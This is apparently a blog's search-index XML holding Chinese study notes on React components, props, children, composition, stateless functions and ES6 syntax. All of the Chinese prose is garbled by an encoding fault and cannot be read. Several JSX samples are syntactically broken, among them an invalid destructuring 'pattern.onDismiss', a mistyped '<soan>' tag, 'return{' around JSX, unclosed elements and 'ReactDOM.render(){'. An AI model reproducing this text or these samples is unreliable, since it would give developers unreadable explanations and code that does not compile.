render()&#123; const &#123;searchText,list&#125; = this.state; return( &lt;div className = &quot;App&quot;&gt; &lt;Search /&gt; &lt;Table /&gt; &lt;/div&gt; ) &#125;&#125; åœ¨ç»„ä»¶ä¼ é€’å±žæ€§å¹¶åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ï¼ŒAppç»„ä»¶éœ€è¦ä¼ é€’æœ¬åœ°çŠ¶æ€ state æ‰˜ç®¡çš„å±žæ€§å’Œå®ƒè‡ªå·±çš„ç±»æ–¹æ³• 12345678910111213141516class App extends Component&#123; render()&#123; const &#123;searchText,list&#125; = this.state; return( &lt;div&gt; &lt;Search value = &#123;searchText&#125; onChange = &#123;this.onSearchChange&#125; /&gt; &lt;Table list = &#123;list&#125; pattern = &#123;searchText&#125; onDismiss = &#123;this.onDismiss&#125; /&gt; &lt;/div&gt; ) &#125;&#125; Searchç»„ä»¶ 12345678910111213class Search extends Component&#123; render()&#123; const &#123;value,onChange&#125; = this.props; return( &lt;form&gt; &lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; ) &#125;&#125; Tableç»„ä»¶ 1234567891011121314151617181920class Table extends Component&#123; render()&#123; const &#123;list,pattern.onDismiss&#125; = this.props; return( &lt;div&gt; &#123;list.filter(isSearched(pattern)).map(item =&gt; &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt;&lt;a href = &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt;&lt;/span&gt; &lt;span&gt;&#123;item.title&#125;&lt;/span&gt; &lt;soan&gt;&#123;item.points&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;button onClick =&#123;() =&gt; onDismiss(item.objectID)&#125;&gt; Dismiss &lt;/button&gt; &lt;/div&gt; )&#125; &lt;/div&gt; ) &#125;&#125; å¯ç»„åˆç»„ä»¶åœ¨ props å¯¹è±¡ä¸­è¿˜æœ‰ä¸€ä¸ªå°å°çš„å±žæ€§å¯ä»¥ä¾›ä½¿ç”¨ï¼š children å±žæ€§.é€šè¿‡è¿™ä¸ªå±žæ€§å¯ä»¥å°†å…ƒç´ ä»Žä¸Šå±‚ä¼ é€’åˆ°ç»„ä»¶ä¸­ï¼Œè¿™äº›å…ƒç´ å¯¹ç»„ä»¶æ¥è¯´æ˜¯æœªçŸ¥çš„ï¼Œä½†æ˜¯å´ä¸ºç»„ä»¶äº’ç›¸ç»“åˆæä¾›äº†å¯èƒ½æ€§ã€ä¸‹ä¾‹ä¸­ï¼Œå°†ä¸€ä¸ªæ–‡æœ¬ä½œä¸ºå­å…ƒç´ ä¼ é€’åˆ°Searchç»„ä»¶ä¸­ 1234567891011class App extends Component&#123; render()&#123; const &#123;searchText,list&#125; = user; return( &lt;div&gt; &lt;Search value = &#123;searchText&#125; onChange = &#123;this.onSearchChange&#125; /&gt; ) &#125;&#125; åœ¨ Search ç»„ä»¶å¯ä»¥ä»Ž props å¯¹è±¡ä¸­è§£æž„å‡º children å±žæ€§ï¼Œå°±å¯ä»¥æŒ‡å®šå®ƒåº”è¯¥åœ¨å“ªé‡Œæ˜¾ç¤º 123456789101112131415class Search extends Component&#123; render()&#123; const &#123;value,onChange,children&#125; = this.props; return( &lt;form&gt; &#123;children&#125; &lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &#125; &lt;/form&gt; ) &#125;&#125; å¯å¤ç”¨ç»„ä»¶å¯å¤ç”¨å’Œå¯ç»„åˆç»„ä»¶å¸®åŠ©ç†è§£åˆç†çš„ç»„ä»¶åˆ†å±‚ï¼Œå®ƒä»¬æ˜¯Reactè§†å›¾å±‚çš„åŸºç¡€ 12345678910111213class Button extends Component&#123; render()&#123; const &#123;onClick,className,children&#125; = this.props; return( &lt;button onClick = &#123;onClick&#125; className = &#123;className&#125; type = &quot;button&quot;&gt; &#123;children&#125; &lt;/button&gt; ) &#125;&#125; Buttonç»„ä»¶æ‹¥æœ‰å•ä¸€å¯ä¿¡æ•°æ®æºï¼Œä¸€ä¸ªButtonç»„ä»¶å¯ä»¥ç«‹å³é‡æž„æ‰€æœ‰buttonã€‚ä¸€ä¸ªButtonç»„ä»¶ç»Ÿæ²»äº†æ‰€æœ‰button &lt;Button onclick = {() =&gt; onDismiss(item.objectID)}&gt;Dissmiss&lt;/Button&gt; å‡½æ•°å¼æ— çŠ¶æ€ç»„ä»¶(function stateless componenet)è¿™ç±»ç»„ä»¶å°±æ˜¯å‡½æ•°ï¼Œå®ƒä»¬æŽ¥å—ä¸€ä¸ªè¾“å…¥å¹¶è¿”å›žä¸€ä¸ªè¾“å‡ºã€‚è¾“å…¥æ—¶propsï¼Œè¾“å‡ºå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„JSXç»„ä»¶å®žä¾‹ã€‚å‡½æ•°å¼æ— çŠ¶æ€ç»„ä»¶æ˜¯å‡½æ•°ï¼Œå¹¶ä¸”å®ƒä»¬æ²¡æœ‰æœ¬åœ°çŠ¶æ€ã€‚ä¸èƒ½é€šè¿‡ this.state æˆ–è€…æ˜¯ this.setState() æ¥è®¿é—®æˆ–è€…æ›´æ–°çŠ¶æ€ï¼Œå› ä¸ºè¿™é‡Œæ²¡æœ‰ this å¯¹è±¡ï¼Œæ­¤å¤–ï¼Œå®ƒä¹Ÿæ²¡æœ‰ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ã€‚ constructor() ä¸Ž render() å°±æ˜¯å…¶ä¸­ä¸¤ä¸ªã€‚ constructor åœ¨ä¸€ä¸ªç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸåªæ‰§è¡Œä¸€æ¬¡ï¼Œè€Œ render() æ–¹æ³•åªä¼šåœ¨æœ€å¼€å§‹æ‰§è¡Œä¸€æ¬¡ ES6 ç±»ç»„ä»¶åœ¨ç±»çš„å®šä¹‰ä¸­ï¼Œå®ƒä»¬ç»§æ‰¿è‡ª React ç»„ä»¶ã€‚ extend ä¼šæ³¨å†Œæ‰€æœ‰çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œåªè¦åœ¨ React component APIä¸­ï¼Œéƒ½å¯ä»¥åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨ render() æ–¹æ³•ï¼Œæ­¤å¤–è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨ this.state å’Œ this.setState() æ¥å­˜å‚¨å’Œæ“ä½œ state æŠŠä¸Šä¾‹çš„Searchç»„ä»¶é‡æž„ä¸ºä¸€ä¸ªå‡½æ•°å¼æ— çŠ¶æ€ç»„ä»¶ 1234567891011function Search(props)&#123; const &#123;value,onChange,children&#125; = props; return&#123; &lt;form&gt; &#123;children&#125;&lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; &#125;&#125; æˆ–è€…å°†å‚æ•°æ”¾åœ¨å‡½æ•°é‡Œé¢ 12345678910function Search(&#123;value,onChange,children&#125;)&#123; return&#123; &lt;form&gt; &#123;children&#125;&lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; &#125;&#125; ç„¶åŽES6 ç®­å¤´å‡½æ•°ä¸€æ³¢ 1234567const Search = (&#123;value,onChange,children&#125;) =&gt; &lt;form&gt; &#123;children&#125;&lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; å¦‚æžœæƒ³åœ¨ES6ç®­å¤´å‡½æ•°å†™æ³•ä¸­åšäº›äº‹æƒ…çš„è¯ å¯ä»¥è¿™æ ·å†™ 123456789101112const Search = (&#123;value,onChange,children&#125;) =&gt; &#123; //do something return( &lt;form&gt; &#123;children&#125;&lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; )&#125; ç»™ç»„ä»¶å£°æ˜Žæ ·å¼å¯ä»¥å¤ç”¨ src/App.css æˆ–è€… src/index.css æ–‡ä»¶ å‚è€ƒé“¾æŽ¥ï¼šhttps://leanpub.com/the-road-to-learn-react-chinese]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road to learn React Part1]]></title>
    <url>%2F2018-06-06-TheRoadtolearnReactPart1.html</url>
    <content type="text"><![CDATA[The Road to learn Reactä¹¦ç±å­¦ä¹ ç¬”è®°(ç¬¬ä¸€ç« ) reactçµæ´»çš„ç”Ÿæ€åœˆSmall ApplicationBoilerplate: create-react-appUtility: JavaScript ES6 and beyondStyling: plain CSS and inline styleAsynchronous Requests: fetchHigher Order Components: optionalFormatting: noneType Checking: none or PropTypesState Management: local stateRouting: none or conditional renderingAuthentication: FirebaseDatabase: FirebaseUI Components: noneTime: moment or date-fnsTesting: Jest Medium ApplicationBoilerplate: create-react-app with ejectUtility: JavaScript ES6 + Lodash or RamdaStyling: CSS modules or Styled ComponentsAsynchronous Requests: fetch or axiosHigher Order Components: maybe + optional recomposeFormatting: PrettierType Checking: none or FlowState Management: local state and very optional ReduxRouting: React RouterAuthentication: FirebaseDatabase: FirebaseUI Components: none or Semantic UITime: moment or date-fnsTesting: Jest with Enzyme Large ApplicationBoilerplate: create-react-app with eject or own boilerplate projectUtility: JavaScript ES6 + Lodash or RamdaStyling: CSS modules or Styled ComponentsAsynchronous Requests: axiosHigher Order Components: maybe + optional recomposeFormatting: PrettierType Checking: FlowState Management: local state and Redux or MobXRouting: React RouterAuthentication: Solution with an own Express/Hapi/Koa Node.js Server with Passport.jsDatabase: Solution with an own Express/Hapi/Koa Node.js Server with a SQL or NoSQL DatabaseUI Components: Semantic UI or own implementation of UI componentsTime: moment or date-fnsTesting: Jest with Enzyme åŸºæœ¬è¦æ±‚npm/nodeNodeåŒ…ç®¡ç†å™¨ï¼ˆnpm/node/package/managerï¼‰å¯ä»¥è®©ä½ é€šè¿‡å‘½ä»¤è¡Œå®‰è£…ç¬¬ä¸‰æ–¹nodeåŒ…ã€‚è¿™äº›åŒ…å¯èƒ½æ˜¯ä¸€ç³»åˆ—çš„å·¥å…·å‡½æ•°ã€åº“ã€æˆ–è€…æ˜¯é›†æˆçš„æ¡†æž¶ é›¶é…ç½®æ­è½½react npm install -g react-reate-app è¿è¡Œ npm start è¿è¡Œæµ‹è¯• npm test æž„å»ºé¡¹ç›®äº§å“æ–‡ä»¶ npm run build ES6ä¸­çš„constä¸Žletè¢«constå£°æ˜Žçš„å˜é‡ä¸èƒ½è¢«é‡æ–°èµ‹å€¼æˆ–è€…æ˜¯é‡æ–°å£°æ˜Žã€‚å¯ä»¥ä½¿ç”¨å®ƒåˆ›å»ºä¸å¯å˜æ•°æ®ç»“æž„ã€‚ä½†å¦‚æžœåˆ›å»ºçš„è¿™ä¸ªå˜é‡æ˜¯æ•°ç»„æˆ–è€…æ˜¯å¯¹è±¡çš„æ—¶å€™ï¼Œé‡Œé¢æŒæœ‰çš„å†…å®¹å¯ä»¥è¢«æ›´æ–°ã€‚å½“ä¸€ä¸ªå˜é‡éœ€è¦è¢«é‡æ–°èµ‹å€¼çš„æ—¶å€™ï¼Œåº”è¯¥ä½¿ç”¨letåŽ»å£°æ˜Žå®ƒ ReactDOMç®€å•åœ°è¯´ï¼ŒReactDOM.render()ä¼šä½¿ç”¨JSXæ›¿æ¢HTMLä¸­ä¸€ä¸ªDOMèŠ‚ç‚¹ï¼Œè¿™æ ·å¯ä»¥å¾ˆå®¹æ˜“åœ°Reacté›†æˆåˆ°æ¯ä¸€ä¸ªå…¶ä»–çš„åº”ç”¨ä¸­ã€‚ReactDOM.render() æœ‰ä¸¤ä¸ªä¼ å…¥å‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å‡†å¤‡æ¸²æŸ“çš„JSX,ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šäº†Reactåº”ç”¨åœ¨HTMLä¸­æ”¾ç½®çš„ä½ç½®ã€‚ æ¨¡å—çƒ­æ›¿æ¢æ¨¡å—çƒ­æ›¿æ¢ï¼ˆHMRï¼‰æ˜¯ä¸€ä¸ªå¸®åŠ©ä½ åœ¨æµè§ˆå™¨ä¸­é‡æ–°åŠ è½½åº”ç”¨çš„å·¥å…·ï¼Œå¹¶ä¸”æ— éœ€è®©æµè§ˆå™¨åˆ·æ–°é¡µé¢ã€‚åœ¨src/index.jsä¸­æ·»åŠ ä¸€äº›é…ç½®ä»£ç  ifï¼ˆmodule.hotï¼‰{module.hot.accept();} ä»£ç æ”¹å˜åŽï¼Œæµè§ˆå™¨å°±ä¸ä¼šåˆ·æ–°é¡µé¢ï¼Œä½†æ˜¯åº”ç”¨è¿˜æ˜¯ä¼šé‡æ–°åŠ è½½å¹¶ä¸”æ­£ç¡®çš„è¾“å‡º JSXä¸­å¤æ‚çš„JavaScriptå®šä¹‰ä¸€ä¸ªåˆ—è¡¨ 123import React, &#123; Component &#125; from &apos;react&apos;;// import logo from &apos;./logo.svg&apos;;import &apos;./App.css&apos;; 123456789101112131415const list = [&#123; title: &apos;React&apos;, url: &apos;https://facebook.github.io/react&apos;, author: &apos;Jordan Walke&apos;, num_comments: 3, points: 4, objectID: 0,&#125;, &#123; title: &apos;Redux&apos;, url: &apos;https://github.com/reactjs/redux&apos;, author: &apos;Dan Abramov, Andrew Clark&apos;, num_comments: 2, points: 5, objectID: 1, &#125;]; åœ¨JSXä¸­ä½¿ç”¨HTMLä¸­çš„JavaScriptæ˜¯å¼ºå¤§çš„ï¼Œå¯ä»¥ä½¿ç”¨mapæ¥å°†ä¸€ä¸ªåˆ—è¡¨è½¬æ¢æˆå¦å¤–ä¸€ä¸ªåˆ—è¡¨ã€‚è®°å¾—åœ¨Reactä¸­æ·»åŠ ä¸€ä¸ªè¾…åŠ©å±žæ€§ï¼Œç»™åˆ—è¡¨çš„æ¯ä¸ªæˆå‘˜åŠ ä¸Šä¸€ä¸ªå…³é”®å­—ï¼ˆkeyï¼‰å±žæ€§ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨åˆ—è¡¨å‘ç”Ÿå˜åŒ–çš„æ—¶å€™è¯†åˆ«å…¶ä¸­æˆå‘˜çš„æ·»åŠ ã€æ›´æ”¹å’Œåˆ é™¤çš„çŠ¶æ€ã€‚ä¸è¦é”™è¯¯åœ°ä½¿ç”¨åˆ—è¡¨æˆå‘˜åœ¨æ•°ç»„çš„ç´¢å¼•ä½œä¸ºå…³é”®å­—ï¼Œåˆ—è¡¨çš„æˆå‘˜ç´¢å¼•æ˜¯å®Œå…¨ä¸ç¨³å®šçš„ 12345678910111213141516171819202122class App extends Component &#123; render() &#123; return ( &lt;div className = &quot;App&quot;&gt; &#123;list.map(function(item)&#123; return( &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href= &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;/div&gt; ); &#125;)&#125; &lt;/div&gt; ); &#125;&#125;export default App; ES6 ç®­å¤´å‡½æ•°ç®­å¤´å‡½æ•°è¡¨è¾¾å¼æ¯”æ™®é€šçš„å‡½æ•°è¡¨è¾¾å¼æ›´åŠ ç®€æ´ 1234//å‡½æ•°è¡¨ç¤ºå¼function()&#123;...&#125;//ç®­å¤´å‡½æ•°ï¼ˆï¼‰ =&gt; &#123;...&#125; æ³¨æ„ï¼šå¦‚æžœå‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå°±å¯ä»¥ç§»é™¤å‚æ•°çš„æ‹¬å·ï¼Œä½†æ˜¯å¦‚æžœæœ‰å¤šä¸ªå‚æ•°ï¼Œå°±å¿…é¡»ä¿ç•™è¿™ä¸ªæ‹¬å· 123456//å…è®¸item =&gt;&#123;...&#125;(item) =&gt;&#123;...&#125;(item,key) =&gt;&#123;...&#125;//ä¸å…è®¸item,key =&gt;&#123;...&#125; ä¸Šä¾‹å¯ä»¥æ”¹å†™ä¸º 1234567891011121314151617181920class App extends Component &#123; render() &#123; return ( &lt;div className = &quot;App&quot;&gt; &#123;list.map(item =&gt;&#123; return( &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href= &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;/div&gt; ); &#125;)&#125; &lt;/div&gt; ); &#125;&#125; å¦å¤–åœ¨ES6çš„ç®­å¤´å‡½æ•°ä¸­ï¼Œå¯ä»¥ç®€æ´å‡½æ•°ä½“æ¥æ›¿æ¢å—çŠ¶å‡½æ•°ä½“ï¼ˆç”¨èŠ±æ‹¬å·{}è¡¨ç¤ºï¼‰ï¼Œç®€æ´å‡½æ•°ä½“çš„è¿”å›žä¸ç”¨æ˜¾ç¤ºå£°æ˜Žï¼Œè¿™æ ·å°±å¯ä»¥ç§»é™¤æŽ‰returnè¡¨ç¤ºå¼ï¼Œé‚£å†æ”¹ç®€æ´ 123456789101112131415161718class App extends Component &#123; render() &#123; return ( &lt;div className = &quot;App&quot;&gt; &#123;list.map(item =&gt; &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href= &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;/div&gt; )&#125; &lt;/div&gt; ); &#125;&#125; ES6ç±»javaScript ES6ä¸­å¼•å…¥äº†ç±»çš„æ¦‚å¿µã€‚ç±»é€šå¸¸åœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹è¯­è¨€ä¸­è¢«ä½¿ç”¨ï¼Œå¯ä»¥æ ¹æ®ä½¿ç”¨æƒ…å†µä¸€è¾¹ä½¿ç”¨å‡½æ•°å¼ç¼–ç¨‹ä¸€è¾¹ä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹å°½ç®¡Reactä¸ºäº†ä¾‹å¦‚ä¸å¯å˜æ•°æ®ç»“æž„ç­‰çš„ç‰¹å¾è€Œæ‹¥æŠ±å‡½æ•°å¼ç¼–ç¨‹ï¼Œä½†æ˜¯å®ƒè¿˜æ˜¯ä½¿ç”¨ç±»æ¥å£°æ˜Žç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶å°±è¢«ç§°ä¸ºES6ç»„ä»¶ï¼ŒReactæ··åˆä½¿ç”¨äº†ä¸¤ç§ç¼–ç¨‹èŒƒå¼ä¸­çš„æœ‰ç›Šéƒ¨åˆ† ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªDeveloperç±» 12345678910class Developer&#123; constructor(firstname,lastname)&#123; this.firstname = firstname; this.lastname = lastname; &#125; getName()&#123; return this.firstname + &apos;&apos; +this.lastname; &#125;&#125; ç±»éƒ½æœ‰ä¸€ä¸ªç”¨æ¥å®žä¾‹åŒ–è‡ªå·±çš„æž„é€ å‡½æ•°ï¼Œè¿™ä¸ªæž„é€ å‡½æ•°å¯ä»¥ç”¨æ¥ä¼ å…¥å‚æ•°æ¥èµ‹äºˆç»™ç±»çš„å®žä¾‹ã€‚æ­¤å¤–ï¼Œç±»å¯å®šä¹‰å‡½æ•°ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°è¢«å…³è”ç»™äº†ç±»ï¼Œæ‰€æœ‰å®ƒè¢«ç§°ä¸ºæ–¹æ³•ï¼Œé€šå¸¸å®ƒè¢«å½“ç§°ä¸ºç±»çš„æ–¹æ³•ã€‚å®žä¾‹åŒ–ä¸Šé¢çš„Develperç±»ï¼Œä»¥åŠä½¿ç”¨å®ƒçš„æ–¹æ³• const Lbh = new Developer(â€˜Laiâ€™,â€™binhongâ€™);console.log(Lbh.getName()); React ä½¿ç”¨JavaScript ES6ç±»æ¥å®žçŽ° ES6ç»„ä»¶ 123456import React, &#123;Component&#125; from &apos;react&apos;; class App extends Component &#123; render()&#123; ... &#125;&#125; Appç±»ç»§æ‰¿è‡ªComponentï¼Œä½ å¯ä»¥å£°æ˜ŽAppç»„ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªç»„ä»¶éœ€è¦ç»§æ‰¿è‡ªå¦ä¸€ä¸ªç»„ä»¶ï¼Œç»§æ‰¿çš„æ„æ€å°±æ˜¯åœ¨ä¸€ä¸ªé¢å‘å¯¹è±¡ç¼–ç¨‹çš„è¯­è¨€ä¸­ï¼Œä½ è¦éœ€è¦éµå¾ªç»§æ‰¿åŽŸåˆ™ï¼Œ å®ƒå¯ä»¥æŠŠåŠŸèƒ½ä»Žä¸€ä¸ªç±»ä¼ é€’åˆ°å¦ä¸€ä¸ªç±» è¿™ä¸ªAppç±»å°±ä»ŽComponentç±»ä¸­ç»§æ‰¿äº†å®ƒçš„åŠŸèƒ½ï¼Œè¿™ä¸ªComponentç±»æ˜¯ä»Žä¸€ä¸ªåŸºæœ¬ES6ç±»ä¸­ç»§æ‰¿æ¥çš„ES6ç»„ä»¶ç±»ã€‚å®ƒ æœ‰ä¸€ä¸ªReactç»„ä»¶æ‰€éœ€è¦çš„æ‰€æœ‰åŠŸèƒ½ã€‚æ¸²æŸ“ï¼ˆrenderï¼‰æ–¹æ³•å°±æ˜¯å…¶ä¸­å¯ä»¥ä½¿ç”¨çš„ä¸€ä¸ªåŠŸèƒ½ã€‚è¿™ä¸ªComponent ç±»å°è£…äº†æ‰€æœ‰Reactç±»éœ€è¦çš„ç»†èŠ‚ã€‚React Componentç±»æš´éœ²å‡ºæ¥çš„æ–¹æ³•éƒ½æ˜¯å…¬å…±çš„æŽ¥å£ï¼Œè¿™äº›æ–¹æ³•æœ‰ä¸€ä¸ªæ–¹æ³•å¿…é¡»è¢«é‡å†™ï¼Œå…¶ä»–çš„åˆ™ä¸ä¸€å®šè¦è¢«é‡å†™ã€‚render()æ–¹æ³•æ˜¯å¿…é¡»è¦è¢«é‡å†™çš„æ–¹æ³•ï¼Œå› ä¸ºä½ å®šä¹‰äº†ä¸€ä¸ªReactç»„ä»¶çš„è¾“å‡ºï¼Œå®ƒå¿…é¡»è¢«å®šä¹‰ å‚è€ƒé“¾æŽ¥ï¼šhttps://leanpub.com/the-road-to-learn-react-chinese]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react-day3]]></title>
    <url>%2F2018-06-05-react-third-day.html</url>
    <content type="text"><![CDATA[react å­¦ä¹ ç¬”è®°day-03 ç»„æˆä¸Žç»§æ‰¿Composition vs Inheritance Reactå…·æœ‰å·¨å¤§çš„ç»„åˆæ¨¡åž‹ï¼ŒæŽ¨èä½¿ç”¨ç»„ä»¶ç»„åˆè€Œä¸æ˜¯ç”¨ç»§æ‰¿ Containment å¾ˆå¤šç»„ä»¶ä¸€å¼€å§‹å¹¶ä¸çŸ¥é“å®ƒä»¬çš„å­ç»„ä»¶æ˜¯ä»€ä¹ˆï¼Œä¾‹å¦‚ä¾§è¾¹æ ï¼Œå¯¹è¯æ¡†ç­‰ å»ºè®®è¿™æ ·çš„ç»„ä»¶ç”¨ç‰¹æ®Šçš„å­ç±»(children)å°†å‚æ•°ç›´æŽ¥ä¼ åˆ°å®ƒä»¬çš„è¾“å‡º 1234567function FancyBorder(props)&#123; return( &lt;div className = &#123;&apos;FancyBoder FancyBorder-&apos; +props.color&#125;&gt; &#123;props.children&#125; &lt;/div&gt; )&#125; è®©ç»„ä»¶é€šè¿‡åµŒå¥—JSXç›´æŽ¥ä¼ å€¼ç»™å­ç±»123456789101112function WelcomeDialog()&#123; return( &lt;FancyBorder color = &quot;blue&quot;&gt; &lt;h1 className = &quot;Dialog-title&quot;&gt; Hi! &lt;/h1&gt; &lt;p className = &quot;Dialog-message&quot;&gt; ä½ å¥½~ &lt;/p&gt; &lt;/FancyBorder&gt; )&#125; æœ‰æ—¶å€™ä½ éœ€è¦å¾ˆå¤šä¸ªåœ°æ–¹æ’å£åœ¨ç»„ä»¶ä¸­ï¼Œè€Œä¸æ˜¯åªä½¿ç”¨children1234567891011121314151617181920212223242526272829function Contacts()&#123; return &lt;div className = &quot;Contacts&quot;/&gt;; &#125; function Chat()&#123; return &lt;div className = &quot;Chat&quot;/&gt;; &#125; function SplitPane(props)&#123; return()&#123; &lt;div className = &quot;SplitPane&quot;&gt; &lt;div className = &quot;SplitPane-left&quot;&gt; &#123;props.left&#125; &lt;/div&gt; &lt;div className = &quot;SpiltPane-right&quot;&gt; &#123;props.right&#125; &lt;/div&gt; &lt;/div&gt; &#125;&#125; function App()&#123; return( &lt;SplitPane left = &#123;&lt;Contacts/&gt;&#125; right = &#123;&lt;Chat/&gt;&#125;&gt; );&#125; ReactDOM.render()&#123; &lt;App/&gt;, document.getElementById()&#125; åœ¨Reactä¸­ï¼Œåƒ&lt;Contanct/&gt;æˆ–è€…&lt;Chat/&gt;ç­‰å…ƒç´ å¯ä»¥çœ‹æˆä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥åƒä¼ å‚æ•°ä¸€æ ·å°†è¿™äº›æ•°æ®ä¼ é€’ã€‚ ç‰¹æ®Šæƒ…å†µ æœ‰æ—¶å€™åœ¨ä¼—å¤šå­ç»„ä»¶ä¸­ï¼Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç»„ä»¶ã€‚ä¸‹ä¾‹ä¸­ï¼ŒWelcomeDialogå°±æ˜¯Dialogä¸­ç‰¹æ®Šçš„ä¸€ä¸ª 123456789101112131415161718192021222324252627282930313233funtion FancyBorder(props)&#123; return( &lt;div className=&#123;&apos;FancyBorder FancyBorder-&apos; + props.color&#125;&gt; &#123;props.children&#125; &lt;/div&gt; );&#125;function Dialog(props)&#123; return( &lt;FancyBorder color = &quot;blue&quot;&gt; &lt;h1 className = &quot;Dialog-title&quot;&gt; &#123;props.title&#125; &lt;/h1&gt; &lt;p className = &quot;Dialog-message&quot;&gt; &#123;props.message&#125; &lt;/p&gt; &lt;/FancyBorder&gt; )&#125; function WelcomeDialog()&#123; return( &lt;Dialog title = &quot;Hi~&quot; message = &quot;ä½ å¥½&quot; /&gt; );&#125; ReactDOM.render()&#123; &lt;WelcomeDialog/&gt;, document.getElementById(&apos;root&apos;)&#125; ç»„ä»¶å¯¹å®šäºŽä¸ºç±»çš„åŒæ ·é€‚ç”¨12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function FancyBorder(props) &#123; return ( &lt;div className=&#123;&apos;FancyBorder FancyBorder-&apos; + props.color&#125;&gt; &#123;props.children&#125; &lt;/div&gt; )&#125;function Dialog(props)&#123; return( &lt;FancyBorder color = &quot;blue&quot;&gt; &lt;div className = &quot;Dialog-title&quot;&gt; &lt;h1&gt;&#123;props.title&#125;&lt;/h1&gt; &lt;/div&gt; &lt;div className = &quot;Dialog-message&quot;&gt; &lt;p&gt;&#123;props.message&#125;&lt;/p&gt; &lt;/div&gt; &lt;div&gt; &#123;props.children&#125; &lt;/div&gt; &lt;/FancyBorder&gt; )&#125;class SignUpDialog extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;signUpName:&apos;&apos;&#125;; this.handleChange = this.handleChange.bind(this); this.handleShow = this.handleShow.bind(this);&#125;handleChange(e)&#123; this.setState(&#123;signUpName:e.target.value&#125;);&#125;handleShow(e)&#123; alert(&apos;ä½ å¥½ &apos; + this.state.signUpName); e.preventDefault();&#125;render()&#123; return( &lt;Dialog title = &quot;ä½ å¥½&quot; message = &quot;æ¬¢è¿Žæ¥åˆ°è¿™é‡Œ&quot; &gt; &lt;input type = &quot;text&quot; value=&#123;this.state.signUpName&#125; onChange = &#123;this.handleChange&#125;/&gt; &lt;button value = &quot;Sign Me Up!&quot; type = &quot;Submit&quot; onClick = &#123;this.handleShow&#125;&gt;Sign Me Up!&lt;/button&gt; &lt;/Dialog&gt; ); &#125;&#125;ReactDOM.render( &lt;SignUpDialog/&gt;, document.getElementById(&apos;root&apos;)) è‡³äºŽç»§æ‰¿å°±æ²¡æœ‰äº†ï¼Œç»„ä»¶å¯ä»¥æŽ¥å—ä»»æ„çš„propsï¼ŒåŒ…æ‹¬åŽŸå§‹å€¼ã€ååº”å…ƒç´ æˆ–å‡½æ•°å¦‚æžœå¸Œæœ›åœ¨ç»„ä»¶ä¹‹é—´é‡ç”¨éžuiåŠŸèƒ½ï¼Œå¯ä»¥å°†å…¶æå–åˆ°å•ç‹¬çš„jsæ¨¡å—ä¸­ï¼Œç»„ä»¶å¯ä»¥å¯¼å…¥å¹¶ä¸”ä½¿ç”¨è¯¥å‡½æ•°ã€å¯¹è±¡ã€æˆ–è€…ç±»ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ‰©å±• å¯¹åº”æž„å»ºReacté¡¹ç›®çš„æ€è€ƒReactæ˜¯ä½¿ç”¨jsæž„å»ºå¤§åž‹ï¼Œå¿«é€Ÿwebåº”ç”¨ç¨‹åºçš„ä¸»è¦æ–¹å¼ã€‚ä¸€èˆ¬æž„å»ºä¸€ä¸ªreactåº”ç”¨ç¨‹åºçš„æ€è€ƒè¿‡ç¨‹å¦‚ä¸‹ï¼š 